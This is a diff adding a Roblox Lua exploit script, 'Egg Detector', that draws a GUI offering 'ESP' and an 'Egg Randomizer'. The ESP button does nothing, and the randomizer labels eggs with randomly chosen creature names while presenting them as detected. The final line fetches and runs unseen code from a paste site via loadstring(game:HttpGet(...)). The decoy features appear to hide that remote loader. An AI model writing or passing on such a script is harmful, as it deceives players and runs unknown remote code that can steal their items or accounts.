@@ -1,2 +1,177 @@
+-- Remove previous GUI if exists
+pcall(function()
+    game.CoreGui.EggDetectorBoxUI:Destroy()
+end)
+
+-- Create new GUI container
+local gui = Instance.new("ScreenGui")
+gui.Name = "EggDetectorBoxUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.DisplayOrder = 9999
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = game:GetService("CoreGui")
+
+-- Top-left box frame (not draggable)
+local frame = Instance.new("Frame")
+frame.Name = "BoxFrame"
+frame.Size = UDim2.new(0, 200, 0, 240)
+frame.Position = UDim2.new(0.02, 0, 0.02, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+frame.ZIndex = 10
+frame.Parent = gui
+
+-- Title Label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.18, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🥚 Egg Detector"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.ZIndex = 10
+title.Parent = frame
+
+-- ESP Toggle Button
+local espButton = Instance.new("TextButton")
+espButton.Size = UDim2.new(0.85, 0, 0.15, 0)
+espButton.Position = UDim2.new(0.075, 0, 0.22, 0)
+espButton.Text = "👁️ ESP: OFF"
+espButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+espButton.TextColor3 = Color3.new(1, 1, 1)
+espButton.TextScaled = true
+espButton.Font = Enum.Font.Gotham
+espButton.BorderSizePixel = 1
+espButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
+espButton.ZIndex = 10
+espButton.Parent = frame
+
+local espOn = false
+espButton.MouseButton1Click:Connect(function()
+    espOn = not espOn
+    espButton.Text = espOn and "👁️ ESP: ON" or "👁️ ESP: OFF"
+end)
+
+-- Egg Selector Label
+local eggSelector = Instance.new("TextLabel")
+eggSelector.Size = UDim2.new(0.85, 0, 0.15, 0)
+eggSelector.Position = UDim2.new(0.075, 0, 0.4, 0)
+eggSelector.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+eggSelector.Text = "🤚 Select Egg To Randomize"
+eggSelector.TextColor3 = Color3.new(1, 1, 1)
+eggSelector.TextScaled = true
+eggSelector.Font = Enum.Font.Gotham
+eggSelector.BorderSizePixel = 1
+eggSelector.BorderColor3 = Color3.fromRGB(255, 255, 255)
+eggSelector.ZIndex = 10
+eggSelector.Parent = frame
+
+-- Egg Randomizer Button
+local randomizerButton = Instance.new("TextButton")
+randomizerButton.Size = UDim2.new(0.85, 0, 0.15, 0)
+randomizerButton.Position = UDim2.new(0.075, 0, 0.58, 0)
+randomizerButton.Text = "🥚 Egg Randomizer: OFF"
+randomizerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+randomizerButton.TextColor3 = Color3.new(1, 1, 1)
+randomizerButton.TextScaled = true
+randomizerButton.Font = Enum.Font.Gotham
+randomizerButton.BorderSizePixel = 1
+randomizerButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
+randomizerButton.ZIndex = 10
+randomizerButton.Parent = frame
+
+-- Footer Label
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0.12, 0)
+footer.Position = UDim2.new(0, 0, 0.85, 0)
+footer.BackgroundTransparency = 1
+footer.Text = "Made By Miszua💀"
+footer.TextColor3 = Color3.new(1, 1, 1)
+footer.TextScaled = true
+footer.Font = Enum.Font.GothamSemibold
+footer.ZIndex = 10
+footer.Parent = frame
+
+-- === Egg Randomizer Logic ===
+local creatureNames = {
+    "Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune"
+}
+
+local nameColors = {
+    Color3.fromRGB(255, 85, 85),
+    Color3.fromRGB(85, 170, 255),
+    Color3.fromRGB(255, 170, 0),
+    Color3.fromRGB(85, 255, 127),
+    Color3.fromRGB(255, 85, 255),
+    Color3.fromRGB(255, 255, 85)
+}
+
+local function addNameToEgg(egg, name)
+    local tag = Instance.new("BillboardGui")
+    tag.Name = "DinoLabel"
+    tag.Size = UDim2.new(0, 200, 0, 50)
+    tag.StudsOffset = Vector3.new(0, 2, 0)
+    tag.AlwaysOnTop = true
+    tag.Adornee = egg
+    tag.Parent = egg
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = name
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.Parent = tag
+
+    -- Special effect for Kitsune
+    if name == "Kitsune" then
+        local uiGradient = Instance.new("UIGradient")
+        uiGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 255)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 255)),
+        })
+        uiGradient.Parent = label
+
+        label.TextColor3 = Color3.new(1, 1, 1)
+        label.TextStrokeTransparency = 0
+        label.TextStrokeColor3 = Color3.new(0, 0, 0)
+    else
+        label.TextColor3 = nameColors[math.random(1, #nameColors)]
+    end
+end
+
+local function clearAllEggLabels()
+    for _, egg in pairs(workspace:GetDescendants()) do
+        if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
+            local label = egg:FindFirstChild("DinoLabel")
+            if label then label:Destroy() end
+        end
+    end
+end
+
+local function applyRandomNamesToEggs()
+    for _, egg in pairs(workspace:GetDescendants()) do
+        if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
+            local name = creatureNames[math.random(1, #creatureNames)]
+            addNameToEgg(egg, name)
+        end
+    end
+end
+
+local randomizerOn = false
+randomizerButton.MouseButton1Click:Connect(function()
+    randomizerOn = not randomizerOn
+    if randomizerOn then
+        randomizerButton.Text = "🥚 Egg Randomizer: ON"
+        applyRandomNamesToEggs()
+    else
+        randomizerButton.Text = "🥚 Egg Randomizer: OFF"
+        clearAllEggLabels()
+    end
+end)
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NsyUc2zmt1/0", true))()
 
